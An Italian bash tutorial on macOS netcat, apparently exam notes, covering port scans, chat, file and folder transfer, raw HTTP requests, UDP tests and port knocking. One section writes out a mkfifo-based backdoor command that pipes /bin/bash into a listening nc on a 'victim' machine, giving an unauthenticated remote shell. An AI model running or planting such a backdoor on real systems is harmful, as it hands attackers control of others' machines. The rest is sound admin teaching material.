#!/bin/bash

# ==============================================================================
# 11. NETCAT (NC) MASTER CLASS: IL COLTELLINO SVIZZERO (MACOS BSD)
# ==============================================================================
# OBIETTIVO:
# Usare nc per scansionare porte, trasferire file, creare chat server,
# debuggare HTTP e (se richiesto) creare reverse shell.
#
# DIFFERENZE CRITICHE MACOS (BSD) vs LINUX (GNU):
# 1. Timeout: MacOS usa '-G <secondi>' per il timeout di connessione.
#             Linux usa '-w <secondi>'.
# 2. Execute: MacOS NON SUPPORTA il flag '-e' (es. nc -e /bin/bash).
#             Bisogna usare i "Named Pipes" (mkfifo) per aggirarlo.
# 3. Output:  I messaggi di stato (-v) vanno su STDERR, non STDOUT.
# ==============================================================================

# ------------------------------------------------------------------------------
# 1. PORT SCANNING (IL CLIENT)
# ------------------------------------------------------------------------------
# Controllare se una porta remota è aperta.
# Flag Vitali:
# -z : Zero-I/O mode (scansiona senza inviare dati).
# -v : Verbose (fondamentale per vedere "succeeded" o "refused").
# -G N : Timeout in secondi (specifico Mac/BSD).

echo "--- 1. PORT SCANNING ---"

TARGET="google.com"
PORTA=443

echo "Testo connessione verso $TARGET:$PORTA..."

# Metodo base (mostra output a video)
nc -z -v -G 2 "$TARGET" "$PORTA"

# Metodo Scripting (Silenzioso, controlla solo Exit Code)
if nc -z -G 2 "$TARGET" "$PORTA"; then
    echo "[OK] Porta $PORTA aperta."
else
    echo "[FAIL] Porta $PORTA chiusa o timeout."
fi

# Scansione Range di Porte (es. 80-85)
# Nota: Lento senza multithreading, ma funziona.
echo "Scansione range 80-82 su google.com:"
nc -z -v -G 1 "$TARGET" 80-82


# ------------------------------------------------------------------------------
# 2. CHAT SERVER (SERVER - CLIENT SEMPLICE)
# ------------------------------------------------------------------------------
# nc può agire da server in ascolto (-l).
# Tutto ciò che scrivi su un terminale appare sull'altro.

echo "----------------------------------------------------------------"
echo "--- 2. CHAT SERVER (DEMO) ---"
echo "Per testare questo, apri DUE terminali."

# TERMINALE A (SERVER):
# -l : Listen mode (ascolta).
# 1234 : La porta su cui ascoltare.
# -k : Keep-alive (non chiudere dopo la prima disconnessione - opzionale).
CMD_SERVER="nc -l 1234"

# TERMINALE B (CLIENT):
# Connettiti a localhost sulla porta 1234
CMD_CLIENT="nc localhost 1234"

echo "1. Lancia: $CMD_SERVER"
echo "2. Lancia: $CMD_CLIENT"
echo "3. Scrivi qualcosa e premi invio."


# ------------------------------------------------------------------------------
# 3. TRASFERIMENTO FILE (FILE TRANSFER)
# ------------------------------------------------------------------------------
# Se SSH o FTP sono bloccati, nc è il modo più veloce per spostare file.
# Funziona con le redirezioni standard (< e >).

echo "----------------------------------------------------------------"
echo "--- 3. FILE TRANSFER ---"

# Creiamo un file da inviare
echo "Dati segreti per esame" > segreto.txt

# SCENARIO: Inviare 'segreto.txt' da QUI (Server) a un Client.

# TERMINALE A (SENDER/SERVER):
# Ascolta sulla 9999 e butta dentro il contenuto del file.
# nc -l 9999 < segreto.txt

# TERMINALE B (RECEIVER/CLIENT):
# Si connette e salva l'output su file.
# nc localhost 9999 > file_ricevuto.txt

echo "Comando Sender:   nc -l 9999 < segreto.txt"
echo "Comando Receiver: nc localhost 9999 > file_ricevuto.txt"


# ------------------------------------------------------------------------------
# 4. DEBUG HTTP (PARLARE COL WEB SERVER)
# ------------------------------------------------------------------------------
# A volte curl non basta. Vuoi vedere ESATTAMENTE cosa succede raw.

echo "----------------------------------------------------------------"
echo "--- 4. HTTP DEBUGGING ---"

# Sintassi: echo "RICHIESTA" | nc host porta
# Due 'echo' vuoti servono per chiudere gli header HTTP correttamente.

echo "Invio richiesta HEAD manuale a google.com..."

(echo "HEAD / HTTP/1.1"; echo "Host: www.google.com"; echo ""; echo "") | nc www.google.com 80

# Analisi output:
# Vedrai "HTTP/1.1 200 OK" o "301 Moved" direttamente dal socket.


# ------------------------------------------------------------------------------
# 5. REVERSE SHELL E BACKDOOR (TRUCCO MACOS) - AVANZATO
# ------------------------------------------------------------------------------
# SCENARIO ESAME:
# "Crea un server che, quando ci si connette, ti dà il controllo della shell."
#
# PROBLEMA MACOS:
# Il comando 'nc -l -p 1234 -e /bin/bash' NON FUNZIONA. Il flag -e manca.
#
# SOLUZIONE: NAMED PIPES (MKFIFO).
# Creiamo un tubo: nc ascolta -> tubo -> bash -> tubo -> nc risponde.

echo "----------------------------------------------------------------"
echo "--- 5. REVERSE SHELL (WORKAROUND MACOS) ---"

# 1. Crea la pipe
PIPE="/tmp/finta_pipe"

# 2. Comando Backdoor (Da eseguire sul Server/Vittima)
CMD_BACKDOOR="rm -f $PIPE; mkfifo $PIPE; cat $PIPE | /bin/bash -i 2>&1 | nc -l 1234 > $PIPE"

echo "Per attivare la backdoor su Mac:"
echo "$CMD_BACKDOOR"
echo ""
echo "Poi dal client connettiti con: nc localhost 1234"
echo "Avrai un prompt di bash remoto!"


# ------------------------------------------------------------------------------
# 6. UDP CONNECTION (-u)
# ------------------------------------------------------------------------------
# Di default nc usa TCP. Per testare DNS (53) o Syslog (514) serve UDP.

echo "----------------------------------------------------------------"
echo "--- 6. UDP MODE (-u) ---"

# Testare se un server DNS risponde (porta 53)
# -u : UDP mode
# -z : Scan mode
# -v : Verbose
echo "Test porta UDP 53 (Google DNS):"
nc -u -z -v -G 2 8.8.8.8 53


# ------------------------------------------------------------------------------
# 7. PORT KNOCKING (BUSSATE)
# ------------------------------------------------------------------------------
# A volte un server apre la porta 22 solo se "bussi" prima su altre porte (es. 7000, 8000).
# Con nc è facile.

echo "----------------------------------------------------------------"
echo "--- 7. PORT KNOCKING ---"

SERVER="myserver.com"
# Bussa in sequenza
# nc -z $SERVER 7000
# nc -z $SERVER 8000
# nc -z $SERVER 9000
# ssh user@$SERVER


# ==============================================================================
# 🧩 SCENARI D'ESAME REALI
# ==============================================================================

# SCENARIO A: "Attendi che il database (porta 3306) sia UP prima di lanciare l'app"
# while ! nc -z -G 1 localhost 3306; do
#   echo "Waiting for DB..."
#   sleep 1
# done
# echo "DB is UP!"

# SCENARIO B: "Clonare un hard disk via rete (estremamente pericoloso ma possibile)"
# Server (Destinazione): nc -l 9000 | dd of=/dev/disk2
# Client (Sorgente):     dd if=/dev/disk1 | nc server_ip 9000

# SCENARIO C: "Chat criptata base (con OpenSSL)"
# Non è nc puro, ma spesso si usa insieme:
# ncat --ssl (non presente su Mac default)
# Soluzione Mac: pipe su openssl s_client.


# ==============================================================================
# ⚠️ TABELLA FLAG VITALI (MACOS BSD NETCAT)
# ==============================================================================
# | FLAG     | DESCRIZIONE                                            |
# |----------|--------------------------------------------------------|
# | -l       | Listen Mode (Server). Ascolta su una porta.            |
# | -p N     | Source Port (spesso non serve con -l su Mac).          |
# | -z       | Zero-I/O (Scan Mode). Non invia dati.                  |
# | -v       | Verbose. Mostra "succeeded" o errori.                  |
# | -G N     | Timeout Connessione in secondi (Specifico Mac).        |
# | -u       | UDP Mode (Default è TCP).                              |
# | -k       | Keep-Alive (Il server non muore dopo 1 connessione).   |
# | -n       | No DNS (Non risolvere nomi host, più veloce).          |
# | (no -e)  | IL FLAG -e NON ESISTE SU MACOS. USA MKFIFO.            |

echo "----------------------------------------------------------------"
echo "Tutorial Netcat Completato."

# ==============================================================================
# GUIDA A NETCAT (nc) - TRASFERIMENTI E SOCKET
# ==============================================================================

# 1. TEST DI CONNETTIVITÀ (Port Scanning)
# ------------------------------------------------------------------------------
# Verifica se una porta è aperta su un server (senza inviare dati)
nc -zv 10.0.14.23 22
# -z : scan mode (non invia dati)
# -v : verbose (ti dice chiaramente se è open o refused)

# Scansione di un range di porte
nc -zv 10.0.14.23 20-80


# 2. TRASFERIMENTO FILE VELOCE (TCP)
# ------------------------------------------------------------------------------
# SUL RICEVENTE (chi aspetta il file):
# nc -l 9000 > file_ricevuto.tar.gz

# SUL MITTENTE (chi invia il file):
# nc 192.168.1.5 9000 < file_da_inviare.tar.gz


# 3. TRASFERIRE UNA CARTELLA AL VOLO (Piping con tar)
# ------------------------------------------------------------------------------
# RICEVENTE:
# nc -l 9000 | tar -xvzf -

# MITTENTE:
# tar -cvzf - nome_cartella | nc 192.168.1.5 9000


# 4. CHAT IMPROVVISATA (Per testare la comunicazione bidirezionale)
# ------------------------------------------------------------------------------
# PC A: nc -l 4444
# PC B: nc [IP_DI_A] 4444


# ==============================================================================
# 💡 SUGGERIMENTI PER L'ESAME (SCENARI PRATICI)
# ==============================================================================

# --- SCENARIO 1: "Non posso usare SCP/SSH, come passo i file?" ---
# Se per qualche motivo SSH è bloccato o non hai le credenziali ma i PC si vedono,
# Netcat è la salvezza. Apri il tunnel su una porta alta (es. 9000) e spara i dati.

# --- SCENARIO 2: "Verifica se il mio script server sta ascoltando" ---
# Se hai scritto uno script che dovrebbe aprire una porta, usa:
# nc -zv localhost [PORTA]
# Se ricevi "Connection refused", il tuo script ha un bug nella creazione del socket.

# --- SCENARIO 3: "Inviare un comando a un server remoto" ---
# echo "GET / HTTP/1.0" | nc google.com 80
# (Simula una richiesta HTTP manuale)

# --- ATTENZIONE: DIFFERENZE DI VERSIONI ---
# Esistono due versioni principali: 'Ncat' (nmap) e 'netcat-openbsd'.
# - Su MacOS: 'nc -l 9000' funziona.
# - Su Linux (alcune versioni): serve 'nc -l -p 9000'. 
# Se vedi un errore sul server, aggiungi sempre '-p' davanti alla porta.

# --- SICUREZZA ---
# Ricorda: Netcat NON cifra nulla. Se passi una password con nc, chiunque nella
# rete locale può leggerla con Wireshark. Usalo solo per test o in reti sicure.